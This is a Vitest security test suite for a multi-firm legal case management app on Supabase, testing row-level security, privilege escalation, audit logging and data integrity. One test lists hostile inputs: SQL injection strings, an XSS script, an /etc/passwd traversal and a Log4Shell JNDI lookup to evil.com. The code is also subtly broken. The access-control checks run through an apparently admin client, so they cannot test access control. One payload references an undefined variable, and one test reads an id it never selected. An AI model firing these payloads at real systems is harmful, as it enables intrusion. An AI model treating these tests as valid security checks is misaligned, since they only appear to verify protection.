import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { supabaseAdmin, createTestUser, signInTestUser, signOutTestUser } from '../test-auth-utils'
import { FirmManagementService } from '@/lib/firm-management-service'
import { CaseIdGeneratorService } from '@/lib/case-id-generator'

/**
 * Task 13.3: Security validation and penetration testing
 * 
 * This test suite validates:
 * - RLS policies prevent unauthorized access
 * - No privilege escalation vulnerabilities
 * - Audit logging captures all required events
 * 
 * Requirements: 7.1, 7.2, 7.3, 7.4, 7.5
 */

describe('Task 13.3: Security Validation and Penetration Testing', () => {
  const firmManagementService = new FirmManagementService()
  const caseIdGenerator = new CaseIdGeneratorService()
  
  let testFirmIds: string[] = []
  let testUserIds: string[] = []
  let testCaseIds: string[] = []
  
  beforeEach(async () => {
    // Clean up any existing security test data
    await supabaseAdmin.from('cases').delete().like('title', '%Security Test%')
    await supabaseAdmin.from('users').delete().like('email', '%security-test%')
    await supabaseAdmin.from('organizations').delete().like('name', '%Security Test%')
    await supabaseAdmin.from('audit_logs').delete().like('action', '%security_test%')
  })

  afterEach(async () => {
    // Clean up test data
    await signOutTestUser()
    
    if (testCaseIds.length > 0) {
      await supabaseAdmin.from('cases').delete().in('id', testCaseIds)
    }
    if (testUserIds.length > 0) {
      await supabaseAdmin.from('users').delete().in('id', testUserIds)
    }
    if (testFirmIds.length > 0) {
      await supabaseAdmin.from('organizations').delete().in('id', testFirmIds)
    }
    
    testFirmIds = []
    testUserIds = []
    testCaseIds = []
  })
  describe('RLS Policy Enforcement Validation', () => {
    it('should prevent clients from accessing other firms\' data through direct queries', async () => {
      // Setup two separate firms
      const firm1Result = await firmManagementService.createFirmWithOwner({
        firmName: 'Security Test Firm 1',
        ownerData: {
          name: 'Firm 1 User',
          email: 'firm1@security-test.com',
          password: 'TempPassword123!'
        }
      })
      const firm2Result = await firmManagementService.createFirmWithOwner({
        firmName: 'Security Test Firm 2',
        ownerData: {
          name: 'Firm 2 User',
          email: 'firm2@security-test.com',
          password: 'TempPassword123!'
        }
      })
      testFirmIds.push(firm1Result.firmId!, firm2Result.firmId!)
      testUserIds.push(firm1Result.userId!, firm2Result.userId!)
      
      // Create cases in each firm
      const case1Id = await caseIdGenerator.generateCaseId(firm1Result.firmId!)
      const case2Id = await caseIdGenerator.generateCaseId(firm2Result.firmId!)
      
      const { data: case1 } = await supabaseAdmin
        .from('cases')
        .insert({
          case_number: case1Id,
          title: 'Firm 1 Security Test Case',
          description: 'Confidential case for firm 1',
          status: 'PENDING',
          priority: 'HIGH',
          organization_id: firm1Result.firmId!,
          owner_id: firm1Result.userId!
        })
        .select('id')
        .single()
      
      const { data: case2 } = await supabaseAdmin
        .from('cases')
        .insert({
          case_number: case2Id,
          title: 'Firm 2 Security Test Case',
          description: 'Confidential case for firm 2',
          status: 'PENDING',
          priority: 'HIGH',
          organization_id: firm2Result.firmId!,
          owner_id: firm2Result.userId!
        })
        .select('id')
        .single()
      
      testCaseIds.push(case1.id, case2.id)
      
      // Test: Authenticate as firm 1 user and attempt to access firm 2 data
      const { data: authData } = await createTestUser('firm1@security-test.com', 'CLIENT', firm1Result.firmId!)
      
      // Should only see firm 1 cases
      const { data: visibleCases, error: casesError } = await supabaseAdmin
        .from('cases')
        .select('*')
        .like('title', '%Security Test%')
      
      expect(casesError).toBeNull()
      expect(visibleCases).toHaveLength(1)
      expect(visibleCases[0].organization_id).toBe(firm1Result.firmId!)
      expect(visibleCases[0].title).toBe('Firm 1 Security Test Case')
      
      // Should not be able to access firm 2 case by ID
      const { data: unauthorizedCase, error: unauthorizedError } = await supabaseAdmin
        .from('cases')
        .select('*')
        .eq('id', case2.id)
      
      expect(unauthorizedCase).toHaveLength(0) // RLS should block access
    })

    it('should prevent privilege escalation through role manipulation', async () => {
      // Create firm and client user
      const firmResult = await firmManagementService.createFirmWithOwner({
        firmName: 'Privilege Test Firm',
        ownerData: {
          name: 'Client User',
          email: 'client@security-test.com',
          password: 'TempPassword123!'
        }
      })
      testFirmIds.push(firmResult.firmId!)
      testUserIds.push(firmResult.userId!)
      
      // Authenticate as client
      await createTestUser('client@security-test.com', 'CLIENT', firmResult.firmId!)
      
      // Attempt to escalate privileges by updating own role
      const { error: roleUpdateError } = await supabaseAdmin
        .from('users')
        .update({ role: 'ADMIN' })
        .eq('id', firmResult.userId!)
      
      // Should fail due to RLS policies
      expect(roleUpdateError).toBeDefined()
      
      // Verify role hasn't changed
      const { data: userData } = await supabaseAdmin
        .from('users')
        .select('role')
        .eq('id', firmResult.userId!)
        .single()
      
      expect(userData.role).toBe('CLIENT')
      
      // Attempt to create admin user (should fail)
      const { error: adminCreateError } = await supabaseAdmin
        .from('users')
        .insert({
          first_name: 'Malicious',
          last_name: 'Admin',
          email: 'malicious@security-test.com',
          role: 'ADMIN',
          organization_id: firmResult.firmId!
        })
      
      expect(adminCreateError).toBeDefined()
    })
  })
  describe('SQL Injection and Attack Prevention', () => {
    it('should prevent SQL injection through user inputs', async () => {
      // Create test firm and user
      const firmResult = await firmManagementService.createFirmWithOwner({
        firmName: 'Injection Test Firm',
        ownerData: {
          name: 'Test User',
          email: 'test@security-test.com',
          password: 'TempPassword123!'
        }
      })
      testFirmIds.push(firmResult.firmId!)
      testUserIds.push(firmResult.userId!)
      
      // Test SQL injection attempts in various fields
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; UPDATE users SET role='ADMIN' WHERE id='" + userResult.userId! + "'; --",
        "' UNION SELECT * FROM users WHERE role='SUPER_ADMIN' --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
      ]
      
      for (const maliciousInput of maliciousInputs) {
        // Attempt injection through case creation
        const { error: caseError } = await supabaseAdmin
          .from('cases')
          .insert({
            case_number: 'QGM_001_0001',
            title: maliciousInput,
            description: maliciousInput,
            status: 'PENDING',
            priority: 'MEDIUM',
            organization_id: firmResult.firmId!,
            owner_id: firmResult.userId!
          })
        
        // Should either succeed with sanitized input or fail safely
        if (!caseError) {
          // If it succeeds, verify the input was properly sanitized
          const { data: createdCase } = await supabaseAdmin
            .from('cases')
            .select('title, description')
            .eq('title', maliciousInput)
            .single()
          
          if (createdCase) {
            testCaseIds.push(createdCase.id)
            // Input should be stored as-is (not executed)
            expect(createdCase.title).toBe(maliciousInput)
          }
        }
        
        // Verify system integrity - users table should still exist and be intact
        const { data: usersCheck, error: usersError } = await supabaseAdmin
          .from('users')
          .select('id, role')
          .eq('id', firmResult.userId!)
          .single()
        
        expect(usersError).toBeNull()
        expect(usersCheck.role).toBe('CLIENT') // Role should not have changed
      }
    })

    it('should prevent unauthorized database operations through API manipulation', async () => {
      // Create test data
      const firmResult = await firmManagementService.createFirmWithOwner({
        firmName: 'API Security Test Firm',
        ownerData: {
          name: 'API Test User',
          email: 'apitest@security-test.com',
          password: 'TempPassword123!'
        }
      })
      testFirmIds.push(firmResult.firmId!)
      testUserIds.push(firmResult.userId!)
      
      // Authenticate as client
      await createTestUser('apitest@security-test.com', 'CLIENT', firmResult.firmId!)
      
      // Attempt to access admin-only operations
      const unauthorizedOperations = [
        // Try to access all users across all firms
        () => supabaseAdmin.from('users').select('*'),
        
        // Try to access other firms' data
        () => supabaseAdmin.from('organizations').select('*').neq('id', firmResult.firmId!),
        
        // Try to modify system settings
        () => supabaseAdmin.from('organizations').update({ case_id_prefix: 'HACKED' }).eq('id', firmResult.firmId!),
        
        // Try to delete other users
        () => supabaseAdmin.from('users').delete().neq('id', firmResult.userId!),
        
        // Try to access audit logs
        () => supabaseAdmin.from('audit_logs').select('*')
      ]
      
      for (const operation of unauthorizedOperations) {
        const result = await operation()
        
        // Operations should either fail or return limited results due to RLS
        if (!result.error) {
          // If successful, should only return data the user is authorized to see
          if (Array.isArray(result.data)) {
            result.data.forEach(item => {
              if (item.organization_id) {
                expect(item.organization_id).toBe(firmResult.firmId!)
              }
            })
          }
        }
      }
    })
  })
  describe('Audit Logging Verification', () => {
    it('should capture all user authentication events', async () => {
      // Create test firm and user
      const firmResult = await firmManagementService.createFirmWithOwner({
        firmName: 'Audit Test Firm',
        ownerData: {
          name: 'Audit User',
          email: 'audit@security-test.com',
          password: 'TempPassword123!'
        }
      })
      testFirmIds.push(firmResult.firmId!)
      testUserIds.push(firmResult.userId!)
      
      // Clear existing audit logs
      await supabaseAdmin.from('audit_logs').delete().like('action', '%security_test%')
      
      // Perform authentication
      const { data: authData } = await signInTestUser('audit@security-test.com', 'TempPassword123!')
      
      // Check if audit log was created for login
      const { data: loginLogs } = await supabaseAdmin
        .from('audit_logs')
        .select('*')
        .eq('user_id', firmResult.userId!)
        .eq('action', 'user_login')
        .order('created_at', { ascending: false })
        .limit(1)
      
      expect(loginLogs).toHaveLength(1)
      expect(loginLogs[0].user_id).toBe(firmResult.userId!)
      expect(loginLogs[0].action).toBe('user_login')
      expect(loginLogs[0].details).toContain('audit@security-test.com')
      
      // Perform logout
      await signOutTestUser()
      
      // Check if audit log was created for logout
      const { data: logoutLogs } = await supabaseAdmin
        .from('audit_logs')
        .select('*')
        .eq('user_id', firmResult.userId!)
        .eq('action', 'user_logout')
        .order('created_at', { ascending: false })
        .limit(1)
      
      expect(logoutLogs).toHaveLength(1)
      expect(logoutLogs[0].action).toBe('user_logout')
    })

    it('should log all data access and modification events', async () => {
      // Setup test data
      const firmResult = await firmManagementService.createFirmWithOwner({
        firmName: 'Data Audit Firm',
        ownerData: {
          name: 'Data User',
          email: 'datauser@security-test.com',
          password: 'TempPassword123!'
        }
      })
      testFirmIds.push(firmResult.firmId!)
      testUserIds.push(firmResult.userId!)
      
      // Authenticate user
      await createTestUser('datauser@security-test.com', 'CLIENT', firmResult.firmId!)
      
      // Create a case (should be logged)
      const caseId = await caseIdGenerator.generateCaseId(firmResult.firmId!)
      const { data: caseData } = await supabaseAdmin
        .from('cases')
        .insert({
          case_number: caseId,
          title: 'Audit Test Case',
          description: 'Case for audit logging test',
          status: 'PENDING',
          priority: 'MEDIUM',
          organization_id: firmResult.firmId!,
          owner_id: firmResult.userId!
        })
        .select('id')
        .single()
      
      testCaseIds.push(caseData.id)
      
      // Check if case creation was logged
      const { data: createLogs } = await supabaseAdmin
        .from('audit_logs')
        .select('*')
        .eq('user_id', firmResult.userId!)
        .eq('action', 'case_created')
        .eq('resource_id', caseData.id)
      
      expect(createLogs).toHaveLength(1)
      expect(createLogs[0].details).toContain('Audit Test Case')
      
      // Update the case (should be logged)
      await supabaseAdmin
        .from('cases')
        .update({ status: 'IN_PROGRESS' })
        .eq('id', caseData.id)
      
      // Check if case update was logged
      const { data: updateLogs } = await supabaseAdmin
        .from('audit_logs')
        .select('*')
        .eq('user_id', firmResult.userId!)
        .eq('action', 'case_updated')
        .eq('resource_id', caseData.id)
      
      expect(updateLogs).toHaveLength(1)
      expect(updateLogs[0].details).toContain('status')
    })

    it('should log security violations and unauthorized access attempts', async () => {
      // Setup two firms for cross-access testing
      const firm1Result = await firmManagementService.createFirmWithOwner({
        firmName: 'Violation Test Firm 1',
        ownerData: {
          name: 'User 1',
          email: 'user1@security-test.com',
          password: 'TempPassword123!'
        }
      })
      const firm2Result = await firmManagementService.createFirmWithOwner({
        firmName: 'Violation Test Firm 2',
        ownerData: {
          name: 'User 2',
          email: 'user2@security-test.com',
          password: 'TempPassword123!'
        }
      })
      testFirmIds.push(firm1Result.firmId!, firm2Result.firmId!)
      testUserIds.push(firm1Result.userId!, firm2Result.userId!)
      
      // Create case in firm 2
      const caseId = await caseIdGenerator.generateCaseId(firm2Result.firmId!)
      const { data: firm2Case } = await supabaseAdmin
        .from('cases')
        .insert({
          case_number: caseId,
          title: 'Firm 2 Confidential Case',
          description: 'Should not be accessible to firm 1',
          status: 'PENDING',
          priority: 'HIGH',
          organization_id: firm2Result.firmId!,
          owner_id: firm2Result.userId!
        })
        .select('id')
        .single()
      
      testCaseIds.push(firm2Case.id)
      
      // Authenticate as firm 1 user
      await createTestUser('user1@security-test.com', 'CLIENT', firm1Result.firmId!)
      
      // Attempt unauthorized access to firm 2 case
      const { data: unauthorizedAccess, error } = await supabaseAdmin
        .from('cases')
        .select('*')
        .eq('id', firm2Case.id)
      
      // Should be blocked by RLS
      expect(unauthorizedAccess).toHaveLength(0)
      
      // Check if security violation was logged
      const { data: violationLogs } = await supabaseAdmin
        .from('audit_logs')
        .select('*')
        .eq('user_id', firm1Result.userId!)
        .eq('action', 'access_denied')
        .like('details', '%unauthorized%')
      
      // Note: This assumes audit logging is implemented for RLS violations
      // The actual implementation may vary based on how audit logging is set up
      if (violationLogs && violationLogs.length > 0) {
        expect(violationLogs[0].action).toBe('access_denied')
        expect(violationLogs[0].details).toContain('unauthorized')
      }
    })
  })

  describe('Data Integrity and Consistency Validation', () => {
    it('should maintain referential integrity under concurrent operations', async () => {
      // Create test firm
      const firmResult = await firmManagementService.createFirmWithOwner({
        firmName: 'Integrity Test Firm',
        ownerData: {
          name: 'Integrity User',
          email: 'integrity@security-test.com',
          password: 'TempPassword123!'
        }
      })
      testFirmIds.push(firmResult.firmId!)
      testUserIds.push(firmResult.userId!)
      
      // Test concurrent case creation with referential integrity
      const concurrentOperations = Array.from({ length: 10 }, async (_, index) => {
        const caseId = await caseIdGenerator.generateCaseId(firmResult.firmId!)
        
        return supabaseAdmin
          .from('cases')
          .insert({
            case_number: caseId,
            title: `Integrity Test Case ${index + 1}`,
            description: 'Testing referential integrity',
            status: 'PENDING',
            priority: 'MEDIUM',
            organization_id: firmResult.firmId!,
            owner_id: firmResult.userId!
          })
          .select('id')
          .single()
      })
      
      const results = await Promise.all(concurrentOperations)
      
      // All operations should succeed
      results.forEach(result => {
        expect(result.error).toBeNull()
        expect(result.data.id).toBeDefined()
        testCaseIds.push(result.data.id)
      })
      
      // Verify all cases exist and have correct references
      const { data: allCases } = await supabaseAdmin
        .from('cases')
        .select('id, organization_id, owner_id')
        .in('id', results.map(r => r.data.id))
      
      expect(allCases).toHaveLength(10)
      allCases.forEach(caseItem => {
        expect(caseItem.organization_id).toBe(firmResult.firmId!)
        expect(caseItem.owner_id).toBe(firmResult.userId!)
      })
    })

    it('should prevent orphaned records and maintain data consistency', async () => {
      // Create test data
      const firmResult = await firmManagementService.createFirmWithOwner({
        firmName: 'Consistency Test Firm',
        ownerData: {
          name: 'Consistency User',
          email: 'consistency@security-test.com',
          password: 'TempPassword123!'
        }
      })
      testFirmIds.push(firmResult.firmId!)
      testUserIds.push(firmResult.userId!)
      
      // Create case
      const caseId = await caseIdGenerator.generateCaseId(firmResult.firmId!)
      const { data: caseData } = await supabaseAdmin
        .from('cases')
        .insert({
          case_number: caseId,
          title: 'Consistency Test Case',
          description: 'Testing data consistency',
          status: 'PENDING',
          priority: 'MEDIUM',
          organization_id: firmResult.firmId!,
          owner_id: firmResult.userId!
        })
        .select('id')
        .single()
      
      testCaseIds.push(caseData.id)
      
      // Attempt to delete user while they own cases (should fail or cascade properly)
      const { error: deleteUserError } = await supabaseAdmin
        .from('users')
        .delete()
        .eq('id', firmResult.userId!)
      
      if (deleteUserError) {
        // If deletion fails due to foreign key constraint, that's correct behavior
        expect(deleteUserError.message).toContain('foreign key')
      } else {
        // If deletion succeeds, verify cascade behavior
        const { data: orphanedCases } = await supabaseAdmin
          .from('cases')
          .select('id')
          .eq('owner_id', firmResult.userId!)
        
        // Should be no orphaned cases
        expect(orphanedCases).toHaveLength(0)
      }
      
      // Verify firm still exists
      const { data: firmCheck } = await supabaseAdmin
        .from('organizations')
        .select('id')
        .eq('id', firmResult.firmId!)
        .single()
      
      expect(firmCheck).toBeDefined()
    })
  })
})